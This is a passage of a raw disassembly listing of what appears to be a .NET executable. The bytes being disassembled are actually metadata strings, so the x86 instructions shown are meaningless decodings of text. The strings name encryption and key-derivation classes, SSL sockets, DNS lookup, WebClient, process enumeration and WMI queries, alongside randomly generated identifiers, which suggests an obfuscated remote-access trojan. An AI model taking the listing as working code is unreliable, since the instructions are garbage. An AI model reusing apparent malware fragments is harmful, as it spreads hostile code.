  409516:	6e                   	outsb  %ds:(%esi),(%dx)
  409517:	61                   	popa
  409518:	67 65 6d             	gs insl (%dx),%es:(%di)
  40951b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40951d:	74 4f                	je     0x40956e
  40951f:	62 6a 65             	bound  %ebp,0x65(%edx)
  409522:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409526:	61                   	popa
  409527:	72 63                	jb     0x40958c
  409529:	68 65 72 00 53       	push   $0x53007265
  40952e:	65 73 73             	gs jae 0x4095a4
  409531:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409538:	6e                   	outsb  %ds:(%esi),(%dx)
  409539:	67 45                	addr16 inc %ebp
  40953b:	76 65                	jbe    0x4095a2
  40953d:	6e                   	outsb  %ds:(%esi),(%dx)
  40953e:	74 48                	je     0x409588
  409540:	61                   	popa
  409541:	6e                   	outsb  %ds:(%esi),(%dx)
  409542:	64 6c                	fs insb (%dx),%es:(%edi)
  409544:	65 72 00             	gs jb  0x409547
  409547:	54                   	push   %esp
  409548:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  40954f:	55                   	push   %ebp
  409550:	70 70                	jo     0x4095c2
  409552:	65 72 00             	gs jb  0x409555
  409555:	43                   	inc    %ebx
  409556:	75 72                	jne    0x4095ca
  409558:	72 65                	jb     0x4095bf
  40955a:	6e                   	outsb  %ds:(%esi),(%dx)
  40955b:	74 55                	je     0x4095b2
  40955d:	73 65                	jae    0x4095c4
  40955f:	72 00                	jb     0x409561
  409561:	53                   	push   %ebx
  409562:	74 72                	je     0x4095d6
  409564:	65 61                	gs popa
  409566:	6d                   	insl   (%dx),%es:(%edi)
  409567:	57                   	push   %edi
  409568:	72 69                	jb     0x4095d3
  40956a:	74 65                	je     0x4095d1
  40956c:	72 00                	jb     0x40956e
  40956e:	54                   	push   %esp
  40956f:	65 78 74             	gs js  0x4095e6
  409572:	57                   	push   %edi
  409573:	72 69                	jb     0x4095de
  409575:	74 65                	je     0x4095dc
  409577:	72 00                	jb     0x409579
  409579:	45                   	inc    %ebp
  40957a:	6e                   	outsb  %ds:(%esi),(%dx)
  40957b:	74 65                	je     0x4095e2
  40957d:	72 00                	jb     0x40957f
  40957f:	42                   	inc    %edx
  409580:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  409587:	72 
  409588:	74 65                	je     0x4095ef
  40958a:	72 00                	jb     0x40958c
  40958c:	54                   	push   %esp
  40958d:	6f                   	outsl  %ds:(%esi),(%dx)
  40958e:	4c                   	dec    %esp
  40958f:	6f                   	outsl  %ds:(%esi),(%dx)
  409590:	77 65                	ja     0x4095f7
  409592:	72 00                	jb     0x409594
  409594:	42                   	inc    %edx
  409595:	53                   	push   %ebx
  409596:	67 6b 6a 4e 67       	imul   $0x67,0x4e(%bp,%si),%ebp
  40959b:	49                   	dec    %ecx
  40959c:	6d                   	insl   (%dx),%es:(%edi)
  40959d:	73 69                	jae    0x409608
  40959f:	72 00                	jb     0x4095a1
  4095a1:	76 4d                	jbe    0x4095f0
  4095a3:	6a 45                	push   $0x45
  4095a5:	6b 68 68 52          	imul   $0x52,0x68(%eax),%ebp
  4095a9:	6d                   	insl   (%dx),%es:(%edi)
  4095aa:	65 6c                	gs insb (%dx),%es:(%edi)
  4095ac:	59                   	pop    %ecx
  4095ad:	47                   	inc    %edi
  4095ae:	52                   	push   %edx
  4095af:	6b 72 00 49          	imul   $0x49,0x0(%edx),%esi
  4095b3:	45                   	inc    %ebp
  4095b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4095b5:	75 6d                	jne    0x409624
  4095b7:	65 72 61             	gs jb  0x40961b
  4095ba:	74 6f                	je     0x40962b
  4095bc:	72 00                	jb     0x4095be
  4095be:	4d                   	dec    %ebp
  4095bf:	61                   	popa
  4095c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4095c1:	61                   	popa
  4095c2:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095c7:	74 4f                	je     0x409618
  4095c9:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095cc:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095d0:	75 6d                	jne    0x40963f
  4095d2:	65 72 61             	gs jb  0x409636
  4095d5:	74 6f                	je     0x409646
  4095d7:	72 00                	jb     0x4095d9
  4095d9:	53                   	push   %ebx
  4095da:	79 73                	jns    0x40964f
  4095dc:	74 65                	je     0x409643
  4095de:	6d                   	insl   (%dx),%es:(%edi)
  4095df:	2e 43                	cs inc %ebx
  4095e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e2:	6c                   	insb   (%dx),%es:(%edi)
  4095e3:	6c                   	insb   (%dx),%es:(%edi)
  4095e4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ea:	73 2e                	jae    0x40961a
  4095ec:	49                   	dec    %ecx
  4095ed:	45                   	inc    %ebp
  4095ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ef:	75 6d                	jne    0x40965e
  4095f1:	65 72 61             	gs jb  0x409655
  4095f4:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  4095f8:	47                   	inc    %edi
  4095f9:	65 74 45             	gs je  0x409641
  4095fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fd:	75 6d                	jne    0x40966c
  4095ff:	65 72 61             	gs jb  0x409663
  409602:	74 6f                	je     0x409673
  409604:	72 00                	jb     0x409606
  409606:	41                   	inc    %ecx
  409607:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40960b:	61                   	popa
  40960c:	74 6f                	je     0x40967d
  40960e:	72 00                	jb     0x409610
  409610:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409615:	00 2e                	add    %ch,(%esi)
  409617:	63 63 74             	arpl   %esp,0x74(%ebx)
  40961a:	6f                   	outsl  %ds:(%esi),(%dx)
  40961b:	72 00                	jb     0x40961d
  40961d:	4d                   	dec    %ebp
  40961e:	6f                   	outsl  %ds:(%esi),(%dx)
  40961f:	6e                   	outsb  %ds:(%esi),(%dx)
  409620:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409627:	65 
  409628:	61                   	popa
  409629:	74 65                	je     0x409690
  40962b:	44                   	inc    %esp
  40962c:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409630:	70 74                	jo     0x4096a6
  409632:	6f                   	outsl  %ds:(%esi),(%dx)
  409633:	72 00                	jb     0x409635
  409635:	43                   	inc    %ebx
  409636:	72 65                	jb     0x40969d
  409638:	61                   	popa
  409639:	74 65                	je     0x4096a0
  40963b:	45                   	inc    %ebp
  40963c:	6e                   	outsb  %ds:(%esi),(%dx)
  40963d:	63 72 79             	arpl   %esi,0x79(%edx)
  409640:	70 74                	jo     0x4096b6
  409642:	6f                   	outsl  %ds:(%esi),(%dx)
  409643:	72 00                	jb     0x409645
  409645:	49                   	dec    %ecx
  409646:	6e                   	outsb  %ds:(%esi),(%dx)
  409647:	74 50                	je     0x409699
  409649:	74 72                	je     0x4096bd
  40964b:	00 45 4a             	add    %al,0x4a(%ebp)
  40964e:	74 73                	je     0x4096c3
  409650:	75 52                	jne    0x4096a4
  409652:	77 65                	ja     0x4096b9
  409654:	47                   	inc    %edi
  409655:	71 54                	jno    0x4096ab
  409657:	79 72                	jns    0x4096cb
  409659:	00 55 6d             	add    %dl,0x6d(%ebp)
  40965c:	51                   	push   %ecx
  40965d:	5a                   	pop    %edx
  40965e:	72 67                	jb     0x4096c7
  409660:	4b                   	dec    %ebx
  409661:	74 6d                	je     0x4096d0
  409663:	46                   	inc    %esi
  409664:	73 00                	jae    0x409666
  409666:	4a                   	dec    %edx
  409667:	7a 75                	jp     0x4096de
  409669:	42                   	inc    %edx
  40966a:	67 78 42             	addr16 js 0x4096af
  40966d:	75 64                	jne    0x4096d3
  40966f:	55                   	push   %ebp
  409670:	53                   	push   %ebx
  409671:	73 00                	jae    0x409673
  409673:	4e                   	dec    %esi
  409674:	4b                   	dec    %ebx
  409675:	43                   	inc    %ebx
  409676:	4f                   	dec    %edi
  409677:	6f                   	outsl  %ds:(%esi),(%dx)
  409678:	4e                   	dec    %esi
  409679:	78 78                	js     0x4096f3
  40967b:	54                   	push   %esp
  40967c:	73 00                	jae    0x40967e
  40967e:	43                   	inc    %ebx
  40967f:	6e                   	outsb  %ds:(%esi),(%dx)
  409680:	55                   	push   %ebp
  409681:	72 64                	jb     0x4096e7
  409683:	77 47                	ja     0x4096cc
  409685:	51                   	push   %ecx
  409686:	79 41                	jns    0x4096c9
  409688:	5a                   	pop    %edx
  409689:	73 00                	jae    0x40968b
  40968b:	53                   	push   %ebx
  40968c:	79 73                	jns    0x409701
  40968e:	74 65                	je     0x4096f5
  409690:	6d                   	insl   (%dx),%es:(%edi)
  409691:	2e 44                	cs inc %esp
  409693:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40969a:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096a1:	72 6f                	jb     0x409712
  4096a3:	73 6f                	jae    0x409714
  4096a5:	66 74 2e             	data16 je 0x4096d6
  4096a8:	56                   	push   %esi
  4096a9:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096b0:	73 69                	jae    0x40971b
  4096b2:	63 2e                	arpl   %ebp,(%esi)
  4096b4:	44                   	inc    %esp
  4096b5:	65 76 69             	gs jbe 0x409721
  4096b8:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096bb:	00 53 79             	add    %dl,0x79(%ebx)
  4096be:	73 74                	jae    0x409734
  4096c0:	65 6d                	gs insl (%dx),%es:(%edi)
  4096c2:	2e 52                	cs push %edx
  4096c4:	75 6e                	jne    0x409734
  4096c6:	74 69                	je     0x409731
  4096c8:	6d                   	insl   (%dx),%es:(%edi)
  4096c9:	65 2e 49             	gs cs dec %ecx
  4096cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4096cd:	74 65                	je     0x409734
  4096cf:	72 6f                	jb     0x409740
  4096d1:	70 53                	jo     0x409726
  4096d3:	65 72 76             	gs jb  0x40974c
  4096d6:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4096dd:	73 74                	jae    0x409753
  4096df:	65 6d                	gs insl (%dx),%es:(%edi)
  4096e1:	2e 52                	cs push %edx
  4096e3:	75 6e                	jne    0x409753
  4096e5:	74 69                	je     0x409750
  4096e7:	6d                   	insl   (%dx),%es:(%edi)
  4096e8:	65 2e 43             	gs cs inc %ebx
  4096eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4096ec:	6d                   	insl   (%dx),%es:(%edi)
  4096ed:	70 69                	jo     0x409758
  4096ef:	6c                   	insb   (%dx),%es:(%edi)
  4096f0:	65 72 53             	gs jb  0x409746
  4096f3:	65 72 76             	gs jb  0x40976c
  4096f6:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4096fd:	62 75 67             	bound  %esi,0x67(%ebp)
  409700:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409707:	65 
  409708:	73 00                	jae    0x40970a
  40970a:	45                   	inc    %ebp
  40970b:	78 70                	js     0x40977d
  40970d:	61                   	popa
  40970e:	6e                   	outsb  %ds:(%esi),(%dx)
  40970f:	64 45                	fs inc %ebp
  409711:	6e                   	outsb  %ds:(%esi),(%dx)
  409712:	76 69                	jbe    0x40977d
  409714:	72 6f                	jb     0x409785
  409716:	6e                   	outsb  %ds:(%esi),(%dx)
  409717:	6d                   	insl   (%dx),%es:(%edi)
  409718:	65 6e                	outsb  %gs:(%esi),(%dx)
  40971a:	74 56                	je     0x409772
  40971c:	61                   	popa
  40971d:	72 69                	jb     0x409788
  40971f:	61                   	popa
  409720:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  409724:	00 47 65             	add    %al,0x65(%edi)
  409727:	74 50                	je     0x409779
  409729:	72 6f                	jb     0x40979a
  40972b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40972e:	73 65                	jae    0x409795
  409730:	73 00                	jae    0x409732
  409732:	47                   	inc    %edi
  409733:	65 74 48             	gs je  0x40977e
  409736:	6f                   	outsl  %ds:(%esi),(%dx)
  409737:	73 74                	jae    0x4097ad
  409739:	41                   	inc    %ecx
  40973a:	64 64 72 65          	fs fs jb 0x4097a3
  40973e:	73 73                	jae    0x4097b3
  409740:	65 73 00             	gs jae 0x409743
  409743:	53                   	push   %ebx
  409744:	79 73                	jns    0x4097b9
  409746:	74 65                	je     0x4097ad
  409748:	6d                   	insl   (%dx),%es:(%edi)
  409749:	2e 53                	cs push %ebx
  40974b:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40974f:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409756:	70 
  409757:	74 6f                	je     0x4097c8
  409759:	67 72 61             	addr16 jb 0x4097bd
  40975c:	70 68                	jo     0x4097c6
  40975e:	79 2e                	jns    0x40978e
  409760:	58                   	pop    %eax
  409761:	35 30 39 43 65       	xor    $0x65433930,%eax
  409766:	72 74                	jb     0x4097dc
  409768:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40976f:	73 00                	jae    0x409771
  409771:	52                   	push   %edx
  409772:	66 63 32             	arpl   %si,(%edx)
  409775:	38 39                	cmp    %bh,(%ecx)
  409777:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  40977b:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  409782:	73 00                	jae    0x409784
  409784:	52                   	push   %edx
  409785:	65 61                	gs popa
  409787:	64 41                	fs inc %ecx
  409789:	6c                   	insb   (%dx),%es:(%edi)
  40978a:	6c                   	insb   (%dx),%es:(%edi)
  40978b:	42                   	inc    %edx
  40978c:	79 74                	jns    0x409802
  40978e:	65 73 00             	gs jae 0x409791
  409791:	47                   	inc    %edi
  409792:	65 74 42             	gs je  0x4097d7
  409795:	79 74                	jns    0x40980b
  409797:	65 73 00             	gs jae 0x40979a
  40979a:	43                   	inc    %ebx
  40979b:	53                   	push   %ebx
  40979c:	68 61 72 70 41       	push   $0x41707261
  4097a1:	72 67                	jb     0x40980a
  4097a3:	75 6d                	jne    0x409812
  4097a5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097a7:	74 49                	je     0x4097f2
  4097a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4097aa:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097ac:	46                   	inc    %esi
  4097ad:	6c                   	insb   (%dx),%es:(%edi)
  4097ae:	61                   	popa
  4097af:	67 73 00             	addr16 jae 0x4097b2
  4097b2:	43                   	inc    %ebx
  4097b3:	53                   	push   %ebx
  4097b4:	68 61 72 70 42       	push   $0x42707261
  4097b9:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097c0:	61                   	popa
  4097c1:	67 73 00             	addr16 jae 0x4097c4
  4097c4:	53                   	push   %ebx
  4097c5:	74 72                	je     0x409839
  4097c7:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097ce:	73 73                	jae    0x409843
  4097d0:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4097d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d8:	67 45                	addr16 inc %ebp
  4097da:	76 65                	jbe    0x409841
  4097dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4097dd:	74 41                	je     0x409820
  4097df:	72 67                	jb     0x409848
  4097e1:	73 00                	jae    0x4097e3
  4097e3:	4e                   	dec    %esi
  4097e4:	69 64 65 4b 4c 5a 43 	imul   $0x56435a4c,0x4b(%ebp,%eiz,2),%esp
  4097eb:	56 
  4097ec:	69 53 6c 73 00 49 43 	imul   $0x43490073,0x6c(%ebx),%edx
  4097f3:	72 65                	jb     0x40985a
  4097f5:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4097f8:	74 69                	je     0x409863
  4097fa:	61                   	popa
  4097fb:	6c                   	insb   (%dx),%es:(%edi)
  4097fc:	73 00                	jae    0x4097fe
  4097fe:	73 65                	jae    0x409865
  409800:	74 5f                	je     0x409861
  409802:	43                   	inc    %ebx
  409803:	72 65                	jb     0x40986a
  409805:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409808:	74 69                	je     0x409873
  40980a:	61                   	popa
  40980b:	6c                   	insb   (%dx),%es:(%edi)
  40980c:	73 00                	jae    0x40980e
  40980e:	45                   	inc    %ebp
  40980f:	71 75                	jno    0x409886
  409811:	61                   	popa
  409812:	6c                   	insb   (%dx),%es:(%edi)
  409813:	73 00                	jae    0x409815
  409815:	53                   	push   %ebx
  409816:	73 6c                	jae    0x409884
  409818:	50                   	push   %eax
  409819:	72 6f                	jb     0x40988a
  40981b:	74 6f                	je     0x40988c
  40981d:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409820:	73 00                	jae    0x409822
  409822:	53                   	push   %ebx
  409823:	79 73                	jns    0x409898
  409825:	74 65                	je     0x40988c
  409827:	6d                   	insl   (%dx),%es:(%edi)
  409828:	2e 57                	cs push %edi
  40982a:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  409831:	46                   	inc    %esi
  409832:	6f                   	outsl  %ds:(%esi),(%dx)
  409833:	72 6d                	jb     0x4098a2
  409835:	73 00                	jae    0x409837
  409837:	44                   	inc    %esp
  409838:	6e                   	outsb  %ds:(%esi),(%dx)
  409839:	73 00                	jae    0x40983b
  40983b:	43                   	inc    %ebx
  40983c:	6f                   	outsl  %ds:(%esi),(%dx)
  40983d:	6e                   	outsb  %ds:(%esi),(%dx)
  40983e:	74 61                	je     0x4098a1
  409840:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409847:	74 65                	je     0x4098ae
  409849:	6d                   	insl   (%dx),%es:(%edi)
  40984a:	2e 43                	cs inc %ebx
  40984c:	6f                   	outsl  %ds:(%esi),(%dx)
  40984d:	6c                   	insb   (%dx),%es:(%edi)
  40984e:	6c                   	insb   (%dx),%es:(%edi)
  40984f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409854:	6e                   	outsb  %ds:(%esi),(%dx)
  409855:	73 00                	jae    0x409857
  409857:	53                   	push   %ebx
  409858:	74 72                	je     0x4098cc
  40985a:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  409861:	74 4f                	je     0x4098b2
  409863:	70 74                	jo     0x4098d9
  409865:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  40986c:	74 49                	je     0x4098b7
  40986e:	6d                   	insl   (%dx),%es:(%edi)
  40986f:	61                   	popa
  409870:	67 65 44             	addr16 gs inc %esp
  409873:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  409877:	65 72 73             	gs jb  0x4098ed
  40987a:	00 52 75             	add    %dl,0x75(%edx)
  40987d:	6e                   	outsb  %ds:(%esi),(%dx)
  40987e:	74 69                	je     0x4098e9
  409880:	6d                   	insl   (%dx),%es:(%edi)
  409881:	65 48                	gs dec %eax
  409883:	65 6c                	gs insb (%dx),%es:(%edi)
  409885:	70 65                	jo     0x4098ec
  409887:	72 73                	jb     0x4098fc
  409889:	00 53 73             	add    %dl,0x73(%ebx)
  40988c:	6c                   	insb   (%dx),%es:(%edi)
  40988d:	50                   	push   %eax
  40988e:	6f                   	outsl  %ds:(%esi),(%dx)
  40988f:	6c                   	insb   (%dx),%es:(%edi)
  409890:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  409897:	72 73                	jb     0x40990c
  409899:	00 46 69             	add    %al,0x69(%esi)
  40989c:	6c                   	insb   (%dx),%es:(%edi)
  40989d:	65 41                	gs inc %ecx
  40989f:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098a2:	73 73                	jae    0x409917
  4098a4:	00 47 65             	add    %al,0x65(%edi)
  4098a7:	74 43                	je     0x4098ec
  4098a9:	75 72                	jne    0x40991d
  4098ab:	72 65                	jb     0x409912
  4098ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ae:	74 50                	je     0x409900
  4098b0:	72 6f                	jb     0x409921
  4098b2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098b5:	73 00                	jae    0x4098b7
  4098b7:	49                   	dec    %ecx
  4098b8:	50                   	push   %eax
  4098b9:	41                   	inc    %ecx
  4098ba:	64 64 72 65          	fs fs jb 0x409923
  4098be:	73 73                	jae    0x409933
  4098c0:	00 53 79             	add    %dl,0x79(%ebx)
  4098c3:	73 74                	jae    0x409939
  4098c5:	65 6d                	gs insl (%dx),%es:(%edi)
  4098c7:	2e 4e                	cs dec %esi
  4098c9:	65 74 2e             	gs je  0x4098fa
  4098cc:	53                   	push   %ebx
  4098cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ce:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098d1:	74 73                	je     0x409946
  4098d3:	00 73 65             	add    %dh,0x65(%ebx)
  4098d6:	74 5f                	je     0x409937
  4098d8:	41                   	inc    %ecx
  4098d9:	72 67                	jb     0x409942
  4098db:	75 6d                	jne    0x40994a
  4098dd:	65 6e                	outsb  %gs:(%esi),(%dx)
  4098df:	74 73                	je     0x409954
  4098e1:	00 53 79             	add    %dl,0x79(%ebx)
  4098e4:	73 74                	jae    0x40995a
  4098e6:	65 6d                	gs insl (%dx),%es:(%edi)
  4098e8:	45                   	inc    %ebp
  4098e9:	76 65                	jbe    0x409950
  4098eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4098ec:	74 73                	je     0x409961
  4098ee:	00 45 78             	add    %al,0x78(%ebp)
  4098f1:	69 73 74 73 00 68 6c 	imul   $0x6c680073,0x74(%ebx),%esi
  4098f8:	75 59                	jne    0x409953
  4098fa:	5a                   	pop    %edx
  4098fb:	42                   	inc    %edx
  4098fc:	54                   	push   %esp
  4098fd:	65 6d                	gs insl (%dx),%es:(%edi)
  4098ff:	76 55                	jbe    0x409956
  409901:	68 55 43 74 00       	push   $0x744355
  409906:	6e                   	outsb  %ds:(%esi),(%dx)
  409907:	4c                   	dec    %esp
  409908:	52                   	push   %edx
  409909:	79 51                	jns    0x40995c
  40990b:	59                   	pop    %ecx
  40990c:	43                   	inc    %ebx
  40990d:	69 4a 74 00 77 72 4a 	imul   $0x4a727700,0x74(%edx),%ecx
  409914:	79 74                	jns    0x40998a
  409916:	65 43                	gs inc %ebx
  409918:	6e                   	outsb  %ds:(%esi),(%dx)
  409919:	65 78 4a             	gs js  0x409966
  40991c:	74 00                	je     0x40991e
  40991e:	72 71                	jb     0x409991
  409920:	4c                   	dec    %esp
  409921:	61                   	popa
  409922:	77 54                	ja     0x409978
  409924:	7a 72                	jp     0x409998
  409926:	66 58                	pop    %ax
  409928:	55                   	push   %ebp
  409929:	74 00                	je     0x40992b
  40992b:	46                   	inc    %esi
  40992c:	74 4c                	je     0x40997a
  40992e:	47                   	inc    %edi
  40992f:	5a                   	pop    %edx
  409930:	79 53                	jns    0x409985
  409932:	68 79 48 7a 5a       	push   $0x5a7a4879
  409937:	74 00                	je     0x409939
  409939:	43                   	inc    %ebx
  40993a:	6f                   	outsl  %ds:(%esi),(%dx)
  40993b:	6e                   	outsb  %ds:(%esi),(%dx)
  40993c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40993f:	00 49 6d             	add    %cl,0x6d(%ecx)
  409942:	61                   	popa
  409943:	67 65 46             	addr16 gs inc %esi
  409946:	6f                   	outsl  %ds:(%esi),(%dx)
  409947:	72 6d                	jb     0x4099b6
  409949:	61                   	popa
  40994a:	74 00                	je     0x40994c
  40994c:	67 65 74 5f          	addr16 gs je 0x4099af
  409950:	41                   	inc    %ecx
  409951:	73 46                	jae    0x409999
  409953:	6c                   	insb   (%dx),%es:(%edi)
  409954:	6f                   	outsl  %ds:(%esi),(%dx)
  409955:	61                   	popa
  409956:	74 00                	je     0x409958
  409958:	73 65                	jae    0x4099bf
  40995a:	74 5f                	je     0x4099bb
  40995c:	41                   	inc    %ecx
  40995d:	73 46                	jae    0x4099a5
  40995f:	6c                   	insb   (%dx),%es:(%edi)
  409960:	6f                   	outsl  %ds:(%esi),(%dx)
  409961:	61                   	popa
  409962:	74 00                	je     0x409964
  409964:	4d                   	dec    %ebp
  409965:	61                   	popa
  409966:	6e                   	outsb  %ds:(%esi),(%dx)
  409967:	61                   	popa
  409968:	67 65 6d             	gs insl (%dx),%es:(%di)
  40996b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40996d:	74 42                	je     0x4099b1
  40996f:	61                   	popa
  409970:	73 65                	jae    0x4099d7
  409972:	4f                   	dec    %edi
  409973:	62 6a 65             	bound  %ebp,0x65(%edx)
  409976:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40997a:	6f                   	outsl  %ds:(%esi),(%dx)
  40997b:	6c                   	insb   (%dx),%es:(%edi)
  40997c:	6c                   	insb   (%dx),%es:(%edi)
  40997d:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409982:	6f                   	outsl  %ds:(%esi),(%dx)
  409983:	6e                   	outsb  %ds:(%esi),(%dx)
  409984:	6e                   	outsb  %ds:(%esi),(%dx)
  409985:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40998a:	65 74 00             	gs je  0x40998d
  40998d:	53                   	push   %ebx
  40998e:	79 73                	jns    0x409a03
  409990:	74 65                	je     0x4099f7
  409992:	6d                   	insl   (%dx),%es:(%edi)
  409993:	2e 4e                	cs dec %esi
  409995:	65 74 00             	gs je  0x409998
  409998:	54                   	push   %esp
  409999:	61                   	popa
  40999a:	72 67                	jb     0x409a03
  40999c:	65 74 00             	gs je  0x40999f
  40999f:	53                   	push   %ebx
  4099a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a1:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099a4:	74 00                	je     0x4099a6
  4099a6:	53                   	push   %ebx
  4099a7:	79 73                	jns    0x409a1c
  4099a9:	74 65                	je     0x409a10
  4099ab:	6d                   	insl   (%dx),%es:(%edi)
  4099ac:	2e 43                	cs inc %ebx
  4099ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4099af:	6c                   	insb   (%dx),%es:(%edi)
  4099b0:	6c                   	insb   (%dx),%es:(%edi)
  4099b1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4099b7:	73 2e                	jae    0x4099e7
  4099b9:	49                   	dec    %ecx
  4099ba:	45                   	inc    %ebp
  4099bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4099bc:	75 6d                	jne    0x409a2b
  4099be:	65 72 61             	gs jb  0x409a22
  4099c1:	74 6f                	je     0x409a32
  4099c3:	72 2e                	jb     0x4099f3
  4099c5:	52                   	push   %edx
  4099c6:	65 73 65             	gs jae 0x409a2e
  4099c9:	74 00                	je     0x4099cb
  4099cb:	67 65 74 5f          	addr16 gs je 0x409a2e
  4099cf:	4f                   	dec    %edi
  4099d0:	66 66 73 65          	data16 data16 jae 0x409a39
  4099d4:	74 00                	je     0x4099d6
  4099d6:	73 65                	jae    0x409a3d
  4099d8:	74 5f                	je     0x409a39
  4099da:	4f                   	dec    %edi
  4099db:	66 66 73 65          	data16 data16 jae 0x409a44
  4099df:	74 00                	je     0x4099e1
  4099e1:	53                   	push   %ebx
  4099e2:	70 6c                	jo     0x409a50
  4099e4:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099eb:	00 
  4099ec:	49                   	dec    %ecx
  4099ed:	41                   	inc    %ecx
  4099ee:	73 79                	jae    0x409a69
  4099f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f1:	63 52 65             	arpl   %edx,0x65(%edx)
  4099f4:	73 75                	jae    0x409a6b
  4099f6:	6c                   	insb   (%dx),%es:(%edi)
  4099f7:	74 00                	je     0x4099f9
  4099f9:	54                   	push   %esp
  4099fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4099fb:	55                   	push   %ebp
  4099fc:	70 70                	jo     0x409a6e
  4099fe:	65 72 49             	gs jb  0x409a4a
  409a01:	6e                   	outsb  %ds:(%esi),(%dx)
  409a02:	76 61                	jbe    0x409a65
  409a04:	72 69                	jb     0x409a6f
  409a06:	61                   	popa
  409a07:	6e                   	outsb  %ds:(%esi),(%dx)
  409a08:	74 00                	je     0x409a0a
  409a0a:	57                   	push   %edi
  409a0b:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a0f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a16:	74 5f                	je     0x409a77
  409a18:	53                   	push   %ebx
  409a19:	73 6c                	jae    0x409a87
  409a1b:	43                   	inc    %ebx
  409a1c:	6c                   	insb   (%dx),%es:(%edi)
  409a1d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a24:	74 5f                	je     0x409a85
  409a26:	53                   	push   %ebx
  409a27:	73 6c                	jae    0x409a95
  409a29:	43                   	inc    %ebx
  409a2a:	6c                   	insb   (%dx),%es:(%edi)
